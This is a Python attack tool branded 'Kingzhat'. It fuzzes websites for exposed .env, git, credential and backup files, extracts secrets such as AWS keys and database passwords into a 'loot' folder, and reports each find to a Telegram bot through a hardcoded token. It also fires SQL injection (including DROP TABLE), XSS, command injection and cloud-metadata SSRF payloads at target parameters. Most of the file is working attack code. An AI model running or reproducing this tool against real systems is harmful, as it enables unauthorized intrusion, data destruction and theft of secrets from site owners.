#!/usr/bin/env python3
"""
OmniScanner Pro V6.8 - Kingzhat Edition
========================================
Severity Levels Classification:
- CRITICAL: Remote Code Execution (RCE), SQL Injection, Auth Bypass
- HIGH: Command Injection, File Inclusion, Path Traversal
- MEDIUM: Information Disclosure, Directory Listing, XXE
- LOW: Verbose Errors, Missing Headers, Information Leakage

RCE Vulnerability Sections Markers:
- [RCE-VULN]: Remote Code Execution vulnerability
- [CMD-INJECT]: Command Injection vulnerability
- [LOG-POISON]: Log poisoning vulnerability
- [PHAR-DESER]: PHAR deserialization vulnerability
- [REV-SHELL]: Reverse shell execution
"""

import requests
import base64
import time
import argparse
import sys
import re
import os
import subprocess
import json
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import urllib.parse

# Disable SSL Warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random

# =============================================================================
# SEVERITY CLASSIFICATION SYSTEM
# =============================================================================
SEVERITY_LEVELS = {
    "CRITICAL": {
        "color": "\033[91m",
        "icon": "[CRIT]",
        "cvss_range": (9.0, 10.0),
        "vulnerabilities": [
            "RCE", "SQL_INJECTION", "AUTH_BYPASS", "DESERIALIZATION",
            "COMMAND_INJECTION", "PHAR_EXECUTION", "LOG_POISONING"
        ]
    },
    "HIGH": {
        "color": "\033[91m",
        "icon": "[HIGH]",
        "cvss_range": (7.0, 8.9),
        "vulnerabilities": [
            "PATH_TRAVERSAL", "FILE_INCLUDE", "COMMAND_INJECTION",
            "REVERSE_SHELL", "PERSISTENCE", "PRIVILEGE_ESCALATION"
        ]
    },
    "MEDIUM": {
        "color": "\033[93m",
        "icon": "[MED]",
        "cvss_range": (4.0, 6.9),
        "vulnerabilities": [
            "DIR_LISTING", "INFO_DISCLOSURE", "XXE", "SENSITIVE_DATA",
            "DEBUG_PAGE", "BACKUP_FILE", "CONFIG_LEAK"
        ]
    },
    "LOW": {
        "color": "\033[94m",
        "icon": "[LOW]",
        "cvss_range": (0.1, 3.9),
        "vulnerabilities": [
            "MISSING_HEADERS", "VERBOSE_ERROR", "INFO_LEAK",
            "VERSION_DISCLOSURE", "TELEGRAM_NOTIFY"
        ]
    },
    "INFO": {
        "color": "\033[96m",
        "icon": "[INF]",
        "cvss_range": (0.0, 0.0),
        "vulnerabilities": [
            "WAF_DETECTED", "OS_FINGERPRINT", "TECH_STACK"
        ]
    }
}

# =============================================================================
# VULNERABILITY TYPE TO SEVERITY MAPPING
# =============================================================================
VULN_SEVERITY_MAP = {
    # CRITICAL Vulnerabilities
    "RCE": "CRITICAL",
    "CMD_INJECTION": "CRITICAL",
    "COMMAND_INJECTION": "CRITICAL",
    "SQL_INJECTION": "CRITICAL",
    "DESERIALIZATION": "CRITICAL",
    "PHAR_EXECUTION": "CRITICAL",
    "LOG_POISONING": "CRITICAL",
    "LARAVEL_RCE": "CRITICAL",
    "CVE": "CRITICAL",
    
    # HIGH Vulnerabilities
    "PATH_TRAVERSAL": "HIGH",
    "FILE_INCLUDE": "HIGH",
    "FILE_READ": "HIGH",
    "REVERSE_SHELL": "HIGH",
    "PERSISTENCE": "HIGH",
    "PRIVILEGE_ESCALATION": "HIGH",
    "UNAUTH_ACCESS": "HIGH",
    
    # MEDIUM Vulnerabilities
    "DIR_LISTING": "MEDIUM",
    "INFO_DISCLOSURE": "MEDIUM",
    "XXE": "MEDIUM",
    "SENSITIVE_DATA": "MEDIUM",
    "DEBUG_PAGE": "MEDIUM",
    "BACKUP_FILE": "MEDIUM",
    "CONFIG_LEAK": "MEDIUM",
    "ENV_LEAK": "MEDIUM",
    "GIT_CONFIG": "MEDIUM",
    "CONFIG_DB": "MEDIUM",
    
    # LOW Vulnerabilities
    "MISSING_HEADERS": "LOW",
    "VERBOSE_ERROR": "LOW",
    "INFO_LEAK": "LOW",
    "VERSION_DISCLOSURE": "LOW",
    "TELEGRAM_NOTIFY": "LOW",
    
    # INFO
    "WAF_DETECTED": "INFO",
    "OS_FINGERPRINT": "INFO",
    "TECH_STACK": "INFO"
}

def get_severity_info(vuln_type):
    """Get severity info based on vulnerability type"""
    severity = VULN_SEVERITY_MAP.get(vuln_type, "MEDIUM")
    return SEVERITY_LEVELS.get(severity, SEVERITY_LEVELS["MEDIUM"])

def classify_vulnerability(vuln_type, cvss_vector=None):
    """
    Classify vulnerability severity based on type and CVSS vector
    
    Args:
        vuln_type: Type of vulnerability
        cvss_vector: Optional CVSS vector string
    
    Returns:
        dict with severity classification
    """
    severity = VULN_SEVERITY_MAP.get(vuln_type, "MEDIUM")
    severity_info = SEVERITY_LEVELS[severity]
    
    # Extract CVSS score if vector provided
    cvss_score = None
    if cvss_vector:
        # Simple CVSS extraction (would need proper parser for full vector)
        try:
            if "CVSS:3.0" in cvss_vector or "CVSS:3.1" in cvss_vector:
                # Extract numeric score from vector
                match = re.search(r'(\d+\.?\d*)$', cvss_vector)
                if match:
                    cvss_score = float(match.group(1))
        except:
            pass
    
    return {
        "severity": severity,
        "display": f"{severity_info['color']}{severity_info['icon']}\033[0m",
        "cvss": cvss_score,
        "description": f"Found {vuln_type} vulnerability"
    }


class OmniScannerPro:
    def __init__(self, target, param=None, lhost=None, lport=None, threads=20, tg_chatid=None, verbose=False):
        self.target = target.rstrip('/')
        self.param = param
        self.lhost = lhost
        self.lport = lport
        self.threads = threads
        self.verbose = verbose
        self.found_params = []
        self.vulnerabilities = []
        self.scan_results = []

        # --- CONFIGURATION ---
        self.tg_token = "8506479078:AAGWbbILfpMvb1Gyfw-Ewq2ssmQgK2FKRCU"
        self.tg_chatid = tg_chatid or "123456789"
        # ---------------------

        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.os_type = "Unknown"

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/143.0.7499.38 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/143.0.7499.38 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.172 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.7; rv:145.0) Gecko/20100101 Firefox/145.0",
        ]

        # Common RCE parameters to test
        self.common_params = [
            "cmd", "exec", "command", "run", "shell", "system", "process", 
            "query", "id", "page", "action", "func", "do", "url", "path",
            "redirect", "target", "src", "dest", "file", "filename"
        ]

        # RCE Payloads for different OS
        self.rce_payloads = {
            "linux": [
                "echo test123",
                "whoami",
                "id",
                "cat /etc/passwd",
                "uname -a",
            ],
            "windows": [
                "whoami",
                "echo test123",
                "systeminfo",
                "ipconfig /all",
            ]
        }

        if not os.path.exists('loot_env'):
            os.makedirs('loot_env')
        if not os.path.exists('reports'):
            os.makedirs('reports')

        # Updated fuzz list - properly formatted
        self.fuzz_list = [
            "{{BaseURL}}/.env",
            "{{BaseURL}}//.env",
            "{{BaseURL}}/.env.example",
            "{{BaseURL}}//.env.example",
            "{{BaseURL}}/laravel/.env",
            "{{BaseURL}}/laravel/.env.example",
            "{{BaseURL}}/admin/.env",
            "{{BaseURL}}/admin/.env.example",
            "{{BaseURL}}/api/.env",
            "{{BaseURL}}/api/.env.example",
            "{{BaseURL}}/backend/.env",
            "{{BaseURL}}/backend/.env.example",
            "{{BaseURL}}/app/.env",
            "{{BaseURL}}/app/.env.example",
            "{{BaseURL}}/config/.env",
            "{{BaseURL}}/config/.env.example",
            "{{BaseURL}}/src/.env",
            "{{BaseURL}}/src/.env.example",
            "{{BaseURL}}/vendor/.env",
            "{{BaseURL}}/vendor/.env.example",
            "{{BaseURL}}/public/.env",
            "{{BaseURL}}/public/.env.example",
            "{{BaseURL}}/storage/.env",
            "{{BaseURL}}/storage/.env.example",
            "{{BaseURL}}/.git/config",
            "{{BaseURL}}/.git/HEAD",
            "{{BaseURL}}/.svn/entries",
            "{{BaseURL}}/wp-config.php.bak",
            "{{BaseURL}}/config.php.bak",
            "{{BaseURL}}/database.yml",
            "{{BaseURL}}/settings.py",
            "{{BaseURL}}/config.json",
            "{{BaseURL}}/credentials.json",
            "{{BaseURL}}/phpinfo.php",
            "{{BaseURL}}/server-status",
            "{{BaseURL}}/server-info",
            "{{BaseURL}}/backup.sql",
            "{{BaseURL}}/dump.sql",
            "{{BaseURL}}/.env.prod",
            "{{BaseURL}}/.env.production",
            "{{BaseURL}}/.env.dev",
            "{{BaseURL}}/.env.development",
            "{{BaseURL}}/upload/",
            "{{BaseURL}}/uploads/",
            "{{BaseURL}}/files/",
            "{{BaseURL}}/assets/",
            "{{BaseURL}}/wp-content/uploads/",
            "{{BaseURL}}/static/",
            "{{BaseURL}}/media/",
            "{{BaseURL}}/images/",
            "{{BaseURL}}/img/",
            "{{BaseURL}}/data/",
            "{{BaseURL}}/backup/",
            "{{BaseURL}}/backups/",
            "{{BaseURL}}/log/",
            "{{BaseURL}}/logs/",
            "{{BaseURL}}/tmp/",
            "{{BaseURL}}/temp/",
            "{{BaseURL}}/cache/",
            "{{BaseURL}}/debug/",
            "{{BaseURL}}/test/",
            "{{BaseURL}}/dev/",
            "{{BaseURL}}/development/",
            "{{BaseURL}}/staging/",
            "{{BaseURL}}/old/",
            "{{BaseURL}}/archive/",
            "{{BaseURL}}/administrator/",
            "{{BaseURL}}/admin/",
            "{{BaseURL}}/manager/",
            "{{BaseURL}}/cpanel/",
            "{{BaseURL}}/phpmyadmin/",
            "{{BaseURL}}/wp-admin/",
            "{{BaseURL}}/wp-login.php",
            "{{BaseURL}}/xmlrpc.php",
            "{{BaseURL}}/robots.txt",
            "{{BaseURL}}/sitemap.xml",
            "{{BaseURL}}/.htaccess",
            "{{BaseURL}}/.env.bak",
            "{{BaseURL}}/storage/logs/",
            "{{BaseURL}}/bootstrap/cache/",
            "{{BaseURL}}/vendor/autoload.php",
            "{{BaseURL}}/composer.json",
            "{{BaseURL}}/package.json",
            "{{BaseURL}}/package-lock.json",
            "{{BaseURL}}/yarn.lock",
            "{{BaseURL}}/requirements.txt",
            "{{BaseURL}}/pipfile",
            "{{BaseURL}}/Gemfile",
            # .txt files - KINGZHAT TXT SCANNER
            "{{BaseURL}}/config.txt",
            "{{BaseURL}}/database.txt",
            "{{BaseURL}}/credentials.txt",
            "{{BaseURL}}/settings.txt",
            "{{BaseURL}}/api.txt",
            "{{BaseURL}}/debug.txt",
            "{{BaseURL}}/test.txt",
            "{{BaseURL}}/backup.txt",
            "{{BaseURL}}/readme.txt",
            "{{BaseURL}}/changelog.txt",
            "{{BaseURL}}/data.txt",
            "{{BaseURL}}/urls.txt",
            "{{BaseURL}}/targets.txt",
            "{{BaseURL}}/subdomain.txt",
            "{{BaseURL}}/admin.txt",
            "{{BaseURL}}/users.txt",
            "{{BaseURL}}/passwords.txt",
            "{{BaseURL}}/env.txt",
            "{{BaseURL}}/production.txt",
            "{{BaseURL}}/development.txt",
            "{{BaseURL}}/config/api.txt",
            "{{BaseURL}}/config/settings.txt",
            "{{BaseURL}}/config/database.txt",
            "{{BaseURL}}/config/credentials.txt",
            "{{BaseURL}}/data/config.txt",
            "{{BaseURL}}/data/database.txt",
            "{{BaseURL}}/includes/config.txt",
            "{{BaseURL}}/includes/database.txt",
            "{{BaseURL}}/backup/config.txt",
            "{{BaseURL}}/backup/database.txt",
            "{{BaseURL}}/logs/debug.txt",
            "{{BaseURL}}/logs/error.txt",
            "{{BaseURL}}/logs/access.txt",
        ]

        # Detection patterns
        self.patterns = {
            "ENV_LEAK": r"(DB_PASSWORD|APP_KEY|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|DATABASE_URL|REDIS_URL|JWT_SECRET)=[\w\-\.\/\+\=]+",
            "GIT_CONFIG": r"\[remote\s+\"origin\"\]|url\s*=\s*git@|repository|\.git",
            "PHP_INFO": r"PHP Version\s+[0-9]+\.[0-9]+|System\s+\w+\s+[\w\.]+|Server API",
            "CONFIG_DB": r"(mysql|postgres|mongodb|redis):\/\/[^\s\"']+|host.*=.*[^\s\"']+",
            "BACKUP_FILE": r"\.(sql|bak|backup|old|orig|tmp|temp)\s*$",
            "DEBUG_PAGE": r"debug|trace|stack\s*trace|error\s*log|warning|notice",
            # TXT FILE DETECTION PATTERNS - KINGZHAT
            "URL_LIST": r"https?://[^\s\"']+",
            "TARGET_LIST": r"(?:target|host|domain|endpoint)[\s=]+[^\s\"']+",
            "API_ENDPOINT": r"api[/\.][^\s\"']+|/api/[^\s\"']+",
            "SENSITIVE_TXT": r"(password|secret|token|key|auth|credential)[\s=:]+[^\s\"']+",
            "CONFIG_TXT": r"(DB_|DATABASE_|APP_|JWT_|AWS_|GOOGLE_)[A-Z_]+=[\w\-\.\/\+\=]+",
        }

        # =========================================================================
        # AGUS VULNERABILITY SCANNER PAYLOADS & PATTERNS
        # =========================================================================
        
        # SQL Injection Payloads
        self.sql_injection_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION ALL SELECT 1,2,3,4,5--",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1--",
            "1; SELECT * FROM users",
            "' OR 'x'='x",
            "'; DROP TABLE users--",
            "1=1",
            "1=2",
            "9999999999 UNION SELECT",
        ]
        
        # SQL Injection Error Patterns
        self.sql_errors = [
            "You have an error in your SQL syntax",
            "Warning: mysql_",
            "MySQL Syntax error",
            "SQL syntax error",
            "ORA-01756",
            "ORA-00933",
            "PLS-00103",
            "Microsoft OLE DB Provider for SQL Server",
            "Unclosed quotation mark",
            "Column count doesn't match",
            "Unknown column",
            "Table '.*' doesn't exist",
            "SQLSTATE[23000]",
            "syntax error at or near",
        ]
        
        # XSS Payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<object data=\"javascript:alert('XSS')\">",
            "<iframe src=\"javascript:alert('XSS')\">",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=1 href=1 onerror=alert('XSS')></img>",
            "<svg><animate onbegin=alert('XSS') attributeName=x></svg>",
        ]
        
        # XSS Detection Patterns
        self.xss_patterns = [
            "<script>alert",
            "onerror=",
            "onload=",
            "onmouseover=",
            "onfocus=",
            "javascript:",
            "svg onload",
            "img onerror",
        ]
        
        # Open Redirect Payloads
        self.open_redirect_payloads = [
            "http://google.com",
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "https: //evil.com",
            "http: //evil.com",
            "https://google.com",
            "http://example.com",
            "https://example.com",
            "///https://google.com",
        ]
        
        # Open Redirect Detection
        self.redirect_patterns = [
            "google.com",
            "evil.com",
            "example.com",
            "redirect",
            "url=",
            "next=",
            "return_url",
            "returnTo",
        ]
        
        # Command Injection Payloads
        self.cmd_injection_payloads = [
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls -la",
            "| ls -la",
            "; pwd",
            "| pwd",
            "&& whoami",
            "|| whoami",
            "; sleep 5",
            "| sleep 5",
            "`sleep 5`",
        ]
        
        # SSRF Payloads
        self.ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/",
            "http://169.254.0.1/",
            "http://localhost/",
            "http://127.0.0.1/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:3306/",
            "http://[::1]/",
            "http://0.0.0.0/",
            "http://0.0.0.0:22/",
            "http://0.0.0.0:3306/",
        ]
        
        # SSRF Detection Patterns
        self.ssrf_indicators = [
            "ami-id",
            "meta-data",
            "user-data",
            "hostname",
            "instance-id",
            "iam/security-credentials",
            "root-ami",
        ]
        
        # Fuzz parameters for vulnerability scanning
        self.vuln_params = [
            "id", "page", "cat", "sort", "order", "q", "s", "search", "keyword",
            "query", "url", "redirect", "return", "next", "prev", "target",
            "dest", "destination", "callback", "src", "file", "filepath",
            "path", "include", "load", "view", "action", "do", "func",
            "user", "username", "email", "password", "token", "api", "key",
        ]

    @staticmethod
    def banner():
        logo = r"""
   _  _  _             _              _
  | |/ /(_) _ __  __ _|_|__ ___  __ _| |_
  | ' < | || '  \/ _` ||_ /|_  |/ _` |  _|
  |_|\_\|_||_|_|_\__, |/__| /_/ \__,_|\__|
                 |___/   [  - KINGZHAT ]
        """
        print("\033[94m" + logo + "\033[0m")
        print(f"\033[90m  OS Fingerprint | WAF Detection | Auto RCE | Nuclei Integration\033[0m")
        print("-" * 75)

    def log(self, message, level="info"):
        """Unified logging with colors"""
        colors = {
            "info": "\033[94m[*]\033[0m",
            "success": "\033[92m[+]\033[0m",
            "warning": "\033[93m[!]\033[0m",
            "error": "\033[91m[-]\033[0m",
            "critical": "\033[91m[CRT]\033[0m",
            "exp": "\033[96m[EXP]\033[0m",
        }
        prefix = colors.get(level, colors["info"])
        print(f"{prefix} {message}")

    def send_telegram(self, message):
        """Send notification to Telegram"""
        if not self.tg_token or not self.tg_chatid:
            return
        url = f"https://api.telegram.org/bot{self.tg_token}/sendMessage"
        data = {"chat_id": self.tg_chatid, "text": f"🚀 *[KINGZHAT-REPORT]*\n{message}", "parse_mode": "Markdown"}
        try:
            requests.post(url, data=data, timeout=5)
        except:
            pass

    def detect_waf(self):
        """Detect WAF/IPS protection"""
        self.log("Checking for WAF/IPS protection...")
        try:
            r = self.session.get(self.target, headers=self.get_headers(), timeout=10)
            headers = str(r.headers).lower()
            
            waf_detected = None
            if "cloudflare" in headers:
                waf_detected = "Cloudflare"
            elif "mod_security" in headers or "modsecurity" in headers:
                waf_detected = "ModSecurity"
            elif "awselb" in headers or "awswaf" in headers:
                waf_detected = "AWS WAF"
            elif "incapsula" in headers:
                waf_detected = "Incapsula"
            elif "sucuri" in headers:
                waf_detected = "Sucuri"
            elif "f5" in headers:
                waf_detected = "F5 BIG-IP"
                
            if waf_detected:
                self.log(f"WAF Detected: {waf_detected}", "warning")
                return waf_detected
            return None
        except Exception as e:
            if self.verbose:
                self.log(f"WAF detection failed: {e}", "error")
            return None

    def detect_os(self):
        """Fingerprint target OS"""
        try:
            r = self.session.get(self.target, headers=self.get_headers(), timeout=5)
            server = r.headers.get('Server', '').lower()
            
            if any(x in server for x in ['win', 'iis', 'asp', 'net']):
                self.os_type = "Windows"
            else:
                self.os_type = "Linux"
            
            self.log(f"Target OS Detected: {self.os_type}", "success")
            return self.os_type
        except:
            self.log("Could not detect OS", "warning")
            return "Unknown"

    def get_headers(self):
        """Generate random headers for each request"""
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
        }

    def auto_download_env(self, url, content, vtype="GENERIC"):
        """Download sensitive files to loot directory"""
        try:
            domain = url.replace('http://', '').replace('https://', '').replace('/', '_').replace('?', '_').replace('&', '_')
            # Limit filename length
            if len(domain) > 100:
                domain = hashlib.md5(domain.encode()).hexdigest()[:16]
            filename = f"loot_env/{domain}.txt"
            
            with open(filename, "w", encoding='utf-8') as f:
                f.write(f"=== URL: {url} ===\n")
                f.write(f"=== Type: {vtype} ===\n")
                f.write(f"=== Time: {datetime.now()} ===\n")
                f.write("="*50 + "\n")
                f.write(content)
            
            self.log(f"Loot Secured: {filename}", "exp")
            self.send_telegram(f"✅ *Loot Secured!*\nTarget: `{url}`\nType: `{vtype}`\nSaved: `{filename}`")
            return filename
        except Exception as e:
            self.log(f"Failed to save loot: {e}", "error")
            return None

    def check_directory_listing(self, url):
        """Check if URL shows directory listing"""
        try:
            r = self.session.get(url, headers=self.get_headers(), timeout=5, allow_redirects=False)
            content = r.text.lower()
            
            # Common directory listing indicators
            indicators = [
                "<title>index of",
                "<h1>index of",
                "<h1>directory listing",
                "directory of",
                "parent directory",
                "[to parent directory]",
                "index of /",
            ]
            
            if any(ind in content for ind in indicators):
                return True
            return False
        except:
            return False

    def fuzzer(self, path):
        """Fuzz for sensitive files and directories"""
        url = path.replace("{{BaseURL}}", self.target)
        
        try:
            r = self.session.get(url, headers=self.get_headers(), timeout=5, allow_redirects=False)
            
            if r.status_code == 200:
                content = r.text
                
                # Check for directory listing
                if self.check_directory_listing(url):
                    self.log(f"Directory Listing: {url}", "warning")
                    self.vulnerabilities.append({
                        "type": "DIR_LISTING",
                        "url": url,
                        "severity": "MEDIUM"
                    })
                    self.auto_download_env(url, content, "DIR_LISTING")
                    return
                
                # Check patterns
                for key, pattern in self.patterns.items():
                    if re.search(pattern, content, re.IGNORECASE):
                        self.log(f"{key} FOUND: {url}", "critical")
                        self.vulnerabilities.append({
                            "type": key,
                            "url": url,
                            "severity": "HIGH"
                        })
                        if "ENV" in key or "CONFIG" in key:
                            self.auto_download_env(url, content, key)
                        return
                
                # If verbose, log found 200 pages
                if self.verbose:
                    self.log(f"200 OK: {url}", "info")
                    
            elif r.status_code == 403:
                if self.verbose:
                    self.log(f"403 Forbidden: {url}", "info")
                    
        except requests.exceptions.Timeout:
            if self.verbose:
                self.log(f"Timeout: {url}", "info")
        except requests.exceptions.ConnectionError:
            if self.verbose:
                self.log(f"Connection Error: {url}", "info")
        except Exception as e:
            if self.verbose:
                self.log(f"Error checking {url}: {e}", "error")

    # =========================================================================
    # AGUS VULNERABILITY SCANNER METHODS
    # =========================================================================
    
    def scan_sql_injection(self):
        """Scan for SQL Injection vulnerabilities"""
        self.log("[AGUS] Scanning for SQL Injection...", "info")
        found_count = 0
        
        for param in self.vuln_params:
            for payload in self.sql_injection_payloads[:5]:  # Limit payloads per param
                try:
                    r = self.session.get(
                        self.target,
                        params={param: payload},
                        headers=self.get_headers(),
                        timeout=10
                    )
                    
                    # Check for SQL errors in response
                    content = r.text.lower()
                    for error in self.sql_errors:
                        if error.lower() in content:
                            self.log(f"SQL Injection Found: {param}={payload[:30]}", "critical")
                            self.vulnerabilities.append({
                                "type": "SQL_INJECTION",
                                "param": param,
                                "payload": payload,
                                "url": self.target,
                                "severity": "CRITICAL",
                                "evidence": error
                            })
                            found_count += 1
                            break
                    
                    # Check for boolean-based SQLi (response size difference)
                    if "1=1" in payload and "1=2" in payload:
                        continue
                        
                except Exception as e:
                    if self.verbose:
                        self.log(f"SQLi test error: {e}", "info")
        
        if found_count == 0:
            self.log("No SQL Injection vulnerabilities found", "success")
        
        return found_count

    def scan_xss(self):
        """Scan for XSS vulnerabilities"""
        self.log("[AGUS] Scanning for XSS...", "info")
        found_count = 0
        
        for param in self.vuln_params:
            for payload in self.xss_payloads[:5]:  # Limit payloads per param
                try:
                    r = self.session.get(
                        self.target,
                        params={param: payload},
                        headers=self.get_headers(),
                        timeout=10
                    )
                    
                    # Check if payload is reflected
                    if payload in r.text:
                        self.log(f"XSS Reflected: {param}={payload[:30]}", "critical")
                        self.vulnerabilities.append({
                            "type": "XSS",
                            "param": param,
                            "payload": payload,
                            "url": self.target,
                            "severity": "HIGH",
                            "vulnerability": "Cross-Site Scripting"
                        })
                        found_count += 1
                        break
                        
                except Exception as e:
                    if self.verbose:
                        self.log(f"XSS test error: {e}", "info")
        
        if found_count == 0:
            self.log("No XSS vulnerabilities found", "success")
        
        return found_count

    def scan_open_redirect(self):
        """Scan for Open Redirect vulnerabilities"""
        self.log("[AGUS] Scanning for Open Redirect...", "info")
        found_count = 0
        
        for param in ["url", "redirect", "next", "return", "target", "dest", "destination", "callback"]:
            for payload in self.open_redirect_payloads[:3]:
                try:
                    r = self.session.get(
                        self.target,
                        params={param: payload},
                        headers=self.get_headers(),
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    # Check for redirect
                    if r.status_code in [301, 302, 303, 307, 308]:
                        location = r.headers.get('Location', '')
                        if payload.replace('http://', '').replace('https://', '') in location:
                            self.log(f"Open Redirect Found: {param}={payload[:30]}", "warning")
                            self.vulnerabilities.append({
                                "type": "OPEN_REDIRECT",
                                "param": param,
                                "payload": payload,
                                "url": self.target,
                                "severity": "MEDIUM",
                                "vulnerability": "Open Redirect",
                                "redirect_to": location
                            })
                            found_count += 1
                            break
                            
                except Exception as e:
                    if self.verbose:
                        self.log(f"Open Redirect test error: {e}", "info")
        
        if found_count == 0:
            self.log("No Open Redirect vulnerabilities found", "success")
        
        return found_count

    def scan_command_injection(self):
        """Scan for Command Injection vulnerabilities"""
        self.log("[AGUS] Scanning for Command Injection...", "info")
        found_count = 0
        
        for param in self.vuln_params:
            for payload in self.cmd_injection_payloads[:5]:
                try:
                    r = self.session.get(
                        self.target,
                        params={param: payload},
                        headers=self.get_headers(),
                        timeout=10
                    )
                    
                    # Check for command output in response
                    content = r.text.lower()
                    if "whoami" in payload and ("root" in content or "www-data" in content or "administrator" in content):
                        self.log(f"Command Injection Found: {param}={payload[:30]}", "critical")
                        self.vulnerabilities.append({
                            "type": "COMMAND_INJECTION",
                            "param": param,
                            "payload": payload,
                            "url": self.target,
                            "severity": "CRITICAL",
                            "vulnerability": "Command Injection"
                        })
                        found_count += 1
                        break
                    
                    if "uid=" in content or "gid=" in content or "groups=" in content:
                        self.log(f"Command Injection Found (id output): {param}", "critical")
                        self.vulnerabilities.append({
                            "type": "COMMAND_INJECTION",
                            "param": param,
                            "payload": payload,
                            "url": self.target,
                            "severity": "CRITICAL",
                            "vulnerability": "Command Injection"
                        })
                        found_count += 1
                        break
                        
                except Exception as e:
                    if self.verbose:
                        self.log(f"Cmd Injection test error: {e}", "info")
        
        if found_count == 0:
            self.log("No Command Injection vulnerabilities found", "success")
        
        return found_count

    def scan_ssrf(self):
        """Scan for SSRF vulnerabilities"""
        self.log("[AGUS] Scanning for SSRF...", "info")
        found_count = 0
        
        for param in ["url", "image", "src", "path", "file", "callback", "api"]:
            for payload in self.ssrf_payloads[:5]:
                try:
                    r = self.session.get(
                        self.target,
                        params={param: payload},
                        headers=self.get_headers(),
                        timeout=10
                    )
                    
                    content = r.text.lower()
                    for indicator in self.ssrf_indicators:
                        if indicator in content:
                            self.log(f"SSRF Found: {param}={payload[:30]}", "critical")
                            self.vulnerabilities.append({
                                "type": "SSRF",
                                "param": param,
                                "payload": payload,
                                "url": self.target,
                                "severity": "HIGH",
                                "vulnerability": "Server-Side Request Forgery",
                                "evidence": indicator
                            })
                            found_count += 1
                            break
                    
                    # Check for AWS metadata
                    if "ami-id" in content or "instance-id" in content:
                        self.log(f"SSRF (AWS Metadata) Found: {param}", "critical")
                        self.vulnerabilities.append({
                            "type": "SSRF",
                            "param": param,
                            "payload": payload,
                            "url": self.target,
                            "severity": "HIGH",
                            "vulnerability": "SSRF - AWS Metadata Access"
                        })
                        found_count += 1
                        break
                        
                except Exception as e:
                    if self.verbose:
                        self.log(f"SSRF test error: {e}", "info")
        
        if found_count == 0:
            self.log("No SSRF vulnerabilities found", "success")
        
        return found_count

    def run_agus_scan(self):
        """Run all AGUS vulnerability scans"""
        self.log("=" * 60, "info")
        self.log("[AGUS] Starting Comprehensive Vulnerability Scan", "warning")
        self.log("=" * 60, "info")
        
        total_vulns = 0
        
        # Run all scans
        total_vulns += self.scan_sql_injection()
        total_vulns += self.scan_xss()
        total_vulns += self.scan_open_redirect()
        total_vulns += self.scan_command_injection()
        total_vulns += self.scan_ssrf()
        
        self.log("=" * 60, "info")
        self.log(f"[AGUS] Scan Complete! Found {total_vulns} vulnerabilities", "success")
        self.log("=" * 60, "info")
        
        return total_vulns

    # =========================================================================
    # TXT FILE SCANNER - KINGZHAT
    # =========================================================================
    
    def extract_urls_from_txt(self, filepath):
        """
        Extract URLs from a local .txt file
        
        Args:
            filepath: Path to the .txt file
            
        Returns:
            list: List of extracted URLs
        """
        urls = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            # Extract URLs using regex
            url_pattern = r'https?://[^\s\"\'<>\]]+'
            found_urls = re.findall(url_pattern, content)
            urls.extend(found_urls)
            
            # Extract domains/hosts
            domain_pattern = r'(?:https?://)?([a-zA-Z0-9][-a-zA-Z0-9]*\.)+[a-zA-Z]{2,}'
            found_domains = re.findall(domain_pattern, content)
            for domain in found_domains:
                if domain not in [u.split('/')[0] if '/' in u else u for u in urls]:
                    urls.append(f"http://{domain}")
            
            self.log(f"Extracted {len(urls)} URLs from {filepath}", "success")
        except Exception as e:
            self.log(f"Error reading {filepath}: {e}", "error")
        
        return urls

